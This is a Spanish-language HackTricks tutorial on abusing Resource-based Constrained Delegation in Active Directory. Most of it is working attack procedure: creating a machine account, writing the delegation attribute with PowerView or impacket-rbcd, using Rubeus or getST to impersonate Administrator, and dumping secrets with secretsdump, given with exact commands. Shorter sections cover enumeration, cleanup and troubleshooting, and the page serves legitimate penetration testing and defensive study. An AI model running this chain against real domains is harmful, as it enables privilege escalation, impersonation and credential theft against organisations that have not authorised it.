# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Conceptos básicos de Resource-based Constrained Delegation

Esto es similar a la básica [Constrained Delegation](constrained-delegation.md) pero **en lugar de** dar permisos a un **objeto** para **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario frente a él.

Otra diferencia importante entre esta Constrained Delegation y otras delegaciones es que cualquier usuario con **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (en las otras formas de Delegation necesitas privilegios de domain admin).

### Nuevos conceptos

Antes, en Constrained Delegation se decía que el flag **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario era necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **service** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** ese flag el TGS devuelto **no** será **Forwardable**.

Sin embargo, si el **TGS** usado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **basic Constrain Delegation** no **funcionará**. Pero si intentas explotar una **Resource-Based constrain delegation**, funcionará.

### Estructura del ataque

> Si tienes **write equivalent privileges** sobre una cuenta de **Computer** puedes obtener **privileged access** en esa máquina.

Supongamos que el atacante ya tiene **write equivalent privileges over the victim computer**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea una** (“Service A”). Ten en cuenta que **cualquier** _Admin User_ sin ningún otro privilegio especial puede **crear** hasta 10 Computer objects (**_MachineAccountQuota_**) y asignarles un **SPN**. Así que el atacante puede simplemente crear un Computer object y establecer un SPN.
2. El atacante **abusa de su WRITE privilege** sobre el equipo víctima (ServiceB) para configurar **resource-based constrained delegation to allow ServiceA to impersonate any user** frente a ese equipo víctima (ServiceB).
3. El atacante usa Rubeus para realizar un **full S4U attack** (S4U2Self y S4U2Proxy) desde Service A hacia Service B para un usuario **con privileged access to Service B**.
1. S4U2Self (desde la cuenta SPN comprometida/creada): Solicita un **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Usa el **not Forwardable TGS** del paso anterior para solicitar un **TGS** de **Administrator** al **victim host**.
3. Incluso si estás usando un TGS no Forwardable, como estás explotando Resource-based constrained delegation, funcionará.
4. El atacante puede **pass-the-ticket** e **impersonate** al usuario para obtener **access to the victim ServiceB**.

Para comprobar el _**MachineAccountQuota**_ del dominio puedes usar:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creación de un objeto de equipo

Puedes crear un objeto de equipo dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurar la delegación restringida basada en recursos

**Usando el módulo activedirectory de PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un S4U attack completo (Windows/Rubeus)

Primero creamos el nuevo objeto Computer con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, el attack puede llevarse a cabo:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets para varios servicios solicitándolos una sola vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Tenga en cuenta que los usuarios tienen un atributo llamado "**Cannot be delegated**". Si un usuario tiene este atributo en True, no podrás suplantarlo. Esta propiedad puede verse dentro de bloodhound.

### Herramientas en Linux: RBCD de extremo a extremo con Impacket (2024+)

Si operas desde Linux, puedes realizar toda la cadena RBCD usando las herramientas oficiales de Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notas
- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
- Prefiere claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus soportan flujos solo-AES.
- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtén el SPN correcto siempre que sea posible (p. ej., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Acceso

La última línea de comando realizará el **ataque S4U completo y inyectará el TGS** desde Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** del Administrator, por lo que podrás acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abusar de diferentes service tickets

Infórmate sobre [**available service tickets here**](silver-ticket.md#available-services).

## Enumeración, auditoría y limpieza

### Enumerar equipos con RBCD configurado

PowerShell (decodificando el SD para resolver SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (leer o vaciar con un solo comando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Limpieza / restablecer RBCD

- PowerShell (borrar el atributo):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES ni RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente pásale los hashes rc4, aes128 y aes256). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual difiere de la del DC y Kerberos no funciona correctamente.
- **`preauth_failed`**: Esto significa que el usuario + hashes proporcionados no funcionan para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Esto puede significar:
- El usuario al que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
- El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
- El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
- Estás abusando de KCD clásico; recuerda que RBCD funciona con tickets S4U2Self non-forwardable, mientras que KCD requiere forwardable.

## Notas, relays y alternativas

- También puedes escribir el SD de RBCD sobre AD Web Services (ADWS) si LDAP está filtrado. See:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Las cadenas de relay de Kerberos frecuentemente terminan en RBCD para conseguir local SYSTEM en un paso. Ver ejemplos prácticos de extremo a extremo:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Si LDAP signing/channel binding están **disabled** y puedes crear una cuenta de equipo, herramientas como **KrbRelayUp** pueden relayer una autenticación Kerberos coaccionada hacia LDAP, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu cuenta de equipo en el objeto del equipo objetivo, e inmediatamente suplantar a **Administrator** vía S4U desde off-host.

## Referencias

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (oficial): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
